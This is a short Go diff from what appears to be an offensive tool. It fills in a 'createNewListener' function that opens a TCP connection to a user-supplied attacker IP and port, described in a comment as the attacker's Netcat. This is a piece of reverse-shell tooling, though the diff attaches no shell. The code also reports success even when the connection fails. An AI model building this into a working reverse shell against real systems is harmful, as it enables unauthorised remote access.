@@ -7,6 +7,7 @@ package cmd
 import (
 	"errors"
 	"fmt"
+	"net"
 	"os"
 
 	"github.com/manifoldco/promptui"
@@ -129,5 +130,13 @@ func createNewListener() { //function to construct our listener
 
 	// Generate the listener using data from the user
 	// Create the TCP connection to your attackers Netcat
-
+	var ipAndPortString string = data.GetIP() + ":" + data.GetPort()
+	connection, err := net.Dial("tcp", ipAndPortString) //dial function connects to a server address, ("protocol", "IP", "Port")
+	if err != nil {                                     //if there is an error
+		fmt.Print(err.Error()) //print the error
+		if nil != connection {
+			connection.Close()
+		}
+	}
+	println("Listener successfully started")
 }
